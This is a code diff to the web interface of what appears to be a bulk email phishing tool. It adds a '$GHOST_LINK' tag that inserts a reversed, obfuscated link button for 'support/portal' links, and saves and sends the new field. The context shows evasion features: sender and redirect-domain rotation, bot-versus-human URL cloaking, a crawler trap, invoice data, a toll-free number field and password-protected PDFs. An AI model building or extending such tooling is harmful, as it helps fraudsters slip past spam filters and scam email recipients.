@@ -819,6 +819,12 @@ details[open] summary{margin-bottom:13px}
             oninput="saveField(this.id)"></textarea>
           <div style="font-size:14px;color:var(--text4);margin-top:10px">Leave blank to send raw links. First domain used for unsubscribe links.</div>
         </div>
+        <div class="tr2">
+          <span class="tc2" style="color:#f59e0b">$GHOST_LINK</span>
+          <span class="td2">Reversed & obfuscated button for support/portal links</span>
+          <button class="tbtn tbtn-copy" onclick="copyTag('$GHOST_LINK')">Copy</button>
+          <button class="tbtn tbtn-insert" onclick="insertTag('$GHOST_LINK')">Insert</button>
+        </div>
         <div class="card" style="margin-top:14px">
           <div class="card" style="margin-top:14px">
             <div class="lbl" style="margin-bottom:12px">Crawler Trap Settings</div>
@@ -1776,13 +1782,12 @@ function buildSmtpArray() {
   });
 }
 
-/* ── PERSISTENCE ── */
 var PIDS = ['rotateLimit', 'tfn', 'fromName', 'recipients', 'tzSendStart', 'tzSendEnd',
             'subjects', 'bodies', 'invoiceData', 'attachHtml', 'attachFormat',
             'redirectDomains', 'domainRotateEvery', 'minDelay', 'maxDelay', 'batchSize',
             'restPeriodMin', 'restPeriodMax', 'warmupDay', 'llmApiKey', 'imapAccounts',
             'graphTenantId', 'graphClientId', 'graphClientSecret', 'graphSender', 'graphProxy',
-            'botSafeUrl', 'humanDefaultUrl', 'pdfPassword']; // <--- ADDED THESE TWO
+            'botSafeUrl', 'humanDefaultUrl', 'pdfPassword', 'ghostLinkInput']; // <--- ADD ghostLinkInput HERE
 
 function saveField(id) {
   try {
@@ -3470,6 +3475,10 @@ async function handleSend() {
       recipients: recips,
       subjects: subjects,
       bodies: bodies,
+      
+      // !!! ADD THIS LINE HERE !!!
+      ghostLinkInput: (document.getElementById('ghostLinkInput').value || '').trim(),
+
       rotateLimit: parseInt(document.getElementById('rotateLimit').value, 10) || 5,
       tfn: (document.getElementById('tfn').value || '').trim(),
       fromName: fromNames[0] || '',
